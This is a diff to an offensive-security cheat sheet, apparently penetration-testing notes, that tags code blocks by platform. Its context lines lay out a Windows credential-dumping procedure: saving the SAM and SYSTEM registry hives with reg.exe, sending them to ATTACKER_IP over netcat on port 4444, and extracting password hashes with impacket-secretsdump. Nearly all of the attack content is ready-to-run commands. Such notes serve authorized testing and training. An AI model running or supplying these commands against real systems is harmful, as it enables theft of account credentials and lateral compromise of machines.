@@ -18,6 +18,7 @@ With sufficient privileges, save the local SAM and SYSTEM registry hives, transf
 
 ## Dump Hives
 
+<!-- cmd: windows -->
 ```cmd
 reg.exe save HKLM\SAM sam.bak
 reg.exe save HKLM\SYSTEM system.bak
@@ -27,12 +28,14 @@ reg.exe save HKLM\SYSTEM system.bak
 
 On Kali:
 
+<!-- cmd: linux -->
 ```bash
 nc -lvnp 4444 > sam.bak
 ```
 
 On the Windows host:
 
+<!-- cmd: windows -->
 ```cmd
 nc-try.exe -w 3 ATTACKER_IP 4444 < C:\Windows\Temp\sam.bak
 ```
@@ -41,6 +44,7 @@ Repeat for `system.bak`.
 
 ## Extract Hashes
 
+<!-- cmd: linux -->
 ```bash
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
